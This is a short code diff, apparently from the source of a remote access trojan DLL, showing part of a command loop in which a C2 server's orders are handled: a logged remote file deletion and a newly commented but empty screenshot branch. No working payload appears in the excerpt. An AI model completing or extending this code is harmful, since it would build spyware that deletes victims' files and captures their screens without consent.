@@ -345,9 +345,10 @@ INT startListen()
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed delete file!\n");
             }
 
+            // C2 says to take a screenshot 
             else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
             {
-
+                
 
             }
         }
